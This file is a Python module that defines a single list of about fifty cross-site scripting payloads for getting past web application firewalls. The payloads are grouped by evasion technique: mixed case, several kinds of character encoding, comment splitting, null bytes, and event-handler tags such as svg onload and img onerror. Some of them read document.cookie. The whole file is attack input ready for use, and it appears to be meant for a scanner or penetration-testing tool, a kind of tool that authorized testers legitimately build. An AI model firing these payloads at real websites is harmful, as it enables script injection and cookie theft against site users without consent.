"""
WAF bypass XSS payloads
"""

WAF_BYPASS_PAYLOADS = [
    # Case variation payloads
    '<ScRiPt>alert(1)</sCrIpT>',
    '<ScRiPt>alert("XSS")</sCrIpT>',
    '<ScRiPt>alert(document.cookie)</sCrIpT>',

    # HTML entity encoding payloads
    '&lt;script&gt;alert(1)&lt;/script&gt;',
    '&lt;script&gt;alert("XSS")&lt;/script&gt;',
    '&lt;script&gt;alert(document.cookie)&lt;/script&gt;',

    # Unicode escape payloads
    '<\u0073cript>alert(1)</\u0073cript>',
    '<\u0073cript>alert("XSS")</\u0073cript>',
    '<\u0073cript>alert(document.cookie)</\u0073cript>',

    # Double encoding payloads
    '%253Cscript%253Ealert(1)%253C%252Fscript%253E',
    '%253Cscript%253Ealert(%2522XSS%2522)%253C%252Fscript%253E',
    '%253Cscript%253Ealert(document.cookie)%253C%252Fscript%253E',

    # Hex encoding payloads
    '\\x3Cscript\\x3Ealert(1)\\x3C/script\\x3E',
    '\\x3Cscript\\x3Ealert("XSS")\\x3C/script\\x3E',
    '\\x3Cscript\\x3Ealert(document.cookie)\\x3C/script\\x3E',

    # Octal encoding payloads
    '\\74script\\76alert(1)\\74/script\\76',
    '\\74script\\76alert("XSS")\\74/script\\76',
    '\\74script\\76alert(document.cookie)\\74/script\\76',

    # Split payload with comments
    '<scri<!-- -->pt>alert(1)</scri<!-- -->pt>',
    '<scri<!-- -->pt>alert("XSS")</scri<!-- -->pt>',
    '<scri<!-- -->pt>alert(document.cookie)</scri<!-- -->pt>',

    # Null byte payloads
    '<script\x00>alert(1)</script>',
    '<script\x00>alert("XSS")</script>',
    '<script\x00>alert(document.cookie)</script>',

    # Space obfuscation payloads
    '<script\x09>alert(1)</script>',
    '<script\x0A>alert(1)</script>',
    '<script\x0D>alert(1)</script>',

    # Protocol obfuscation payloads
    'javascript\x3Aalert(1)',
    'javascript\x3Aalert("XSS")',
    'javascript\x3Aalert(document.cookie)',

    # Exotic event handlers
    '<svg/onload=alert(1)>',
    '<svg/onload=alert("XSS")>',
    '<svg/onload=alert(document.cookie)>',

    # No quotes payloads
    '<img src=x onerror=alert(1)>',
    '<img src=x onerror=alert(document.cookie)>',
    '<img src=x onerror=alert`1`>',

    # Backtick payloads
    '<img src=x onerror=alert`XSS`>',
    '<img src=x onerror=alert`document.cookie`>',
    '<script>alert`1`</script>',

    # Exotic attributes
    '<div/onmouseover=alert(1)>',
    '<div/onmouseover=alert("XSS")>',
    '<div/onmouseover=alert(document.cookie)>',

    # Exotic tags
    '<details/open/ontoggle=alert(1)>',
    '<details/open/ontoggle=alert("XSS")>',
    '<details/open/ontoggle=alert(document.cookie)>',

    # Nested payloads
    '"><img src=x onerror=alert(1)>',
    '"><img src=x onerror=alert("XSS")>',
    '"><img src=x onerror=alert(document.cookie)>',
]
